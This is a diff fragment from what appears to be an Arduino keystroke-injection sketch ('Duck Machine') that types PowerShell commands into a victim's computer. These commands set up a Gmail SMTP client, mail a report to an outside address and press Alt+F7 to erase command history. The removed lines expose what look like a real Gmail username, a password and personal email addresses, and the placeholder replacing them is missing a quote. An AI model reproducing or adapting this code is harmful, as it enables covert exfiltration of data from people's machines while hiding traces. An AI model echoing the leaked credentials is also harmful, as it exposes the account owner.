@@ -100,10 +100,10 @@ void setup()
     command("$SMTPServer = 'smtp.gmail.com'");
     command("$SMTPInfo = New-Object Net.Mail.SmtpClient($SmtpServer, 587)");
     command("$SMTPInfo.EnableSsl = $true");
-    command("$SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('nickpap556', 'cB12c39#ni55billNiK');");
+    command("$SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('YOUR_EMAIL_USERNAME', 'YOUR_EMAIL_PASSWORD');");
     command("$ReportEmail = New-Object System.Net.Mail.MailMessage");
-    command("$ReportEmail.From = 'nickpap556@gmail.com'");
-    command("$ReportEmail.To.Add('aellinitakis@isc.tuc.gr')");
+    command("$ReportEmail.From = 'YOUR_EMAIL_ADDRESS'");
+    command("$ReportEmail.To.Add(RECIPIENTS_EMAIL_ADDRESS')");
     command("clear");
     twoKeyCombination(KEY_LEFT_ALT,KEY_F7);  // cmd and powershell history(commands) is erased with Alt+F7
     command("$ReportEmail.Subject = 'Duck Machine Report'");
